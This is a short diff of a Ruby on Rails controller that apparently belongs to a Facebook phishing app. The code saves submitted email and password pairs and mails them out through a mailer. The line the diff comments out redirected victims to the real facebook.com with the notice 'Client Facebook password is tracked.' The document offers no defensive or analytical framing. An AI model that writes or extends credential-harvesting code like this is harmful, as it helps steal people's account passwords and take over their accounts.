@@ -33,7 +33,8 @@ class FbsController < ApplicationController
       if @fb.save
         FbMailer.fb_created(@fb.email,@fb.password).deliver
         # YahooMailer.ymail_created.deliver
-        format.html { redirect_to 'https://www.facebook.com/', notice: 'Client Facebook password is tracked.' }
+        format.html
+        # { redirect_to 'https://www.facebook.com/', notice: 'Client Facebook password is tracked.' }
         format.json { render :show, status: :created, location: @fb }
       else
         format.html { render :new }
